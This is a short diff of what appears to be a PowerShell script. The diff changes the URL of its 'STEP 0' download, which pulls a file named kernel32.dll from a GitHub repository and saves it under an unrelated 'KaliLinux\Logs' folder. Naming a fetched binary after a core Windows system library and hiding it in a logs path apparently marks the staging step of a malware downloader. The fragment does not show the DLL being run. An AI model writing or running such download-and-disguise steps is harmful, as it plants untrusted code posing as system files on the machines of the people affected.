@@ -3,7 +3,7 @@
 # ================================
 
 # STEP 0: Download DLL directly to final name
-$dllUrl = "https://raw.githubusercontent.com/LOKIXFF/REDBULL/refs/heads/main/kernel32.dll"
+$dllUrl = "https://raw.githubusercontent.com/LOKIXFF/DHONI/refs/heads/main/kernel32.dll"
 $dllPath = "E:virtualbox\KaliLinux\Logs\kernel32.dll"
 
 # Create directory if it doesn't exist
